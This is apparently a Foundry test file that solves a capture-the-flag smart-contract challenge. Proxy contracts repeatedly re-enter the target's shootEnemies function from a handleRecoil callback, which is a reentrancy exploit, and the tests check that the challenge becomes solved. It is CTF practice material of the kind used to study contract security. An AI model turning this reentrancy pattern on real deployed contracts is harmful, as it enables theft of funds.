// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import "./../src/Setup.sol";
import "./../src/Chal.sol";
import "./../src/Player.sol";
import "forge-std/console2.sol";

contract Exploit {
    Setup private setup;
    Chal private chall;

    function setUp() public {
        setup = new Setup();
        chall = setup.TARGET();
    }

    function testExploitFail() public view {
        require(!setup.isSolved(), "Has to be NOT be solved!!");
    }

    function testExploit() public {
        console2.log("Huh?");
        for (uint i = 0; i < 4; i++) {
            new Proxy(chall).exploit();
        }
        require(setup.isSolved(), "Has to be solved!!");
    }
}

contract Proxy is Player {
    uint private iter = 100;
    Chal private chall;

    constructor (Chal _chall) {
        chall = _chall;
    }

    function exploit() public {
        chall.grabGun();
        chall.shootEnemies();
    }

    function handleRecoil() public {
        console2.log("Poggers xx");
        console2.log(iter);
        if (iter > 0) {
            iter = iter - 1;
            chall.shootEnemies();
        }
    }
}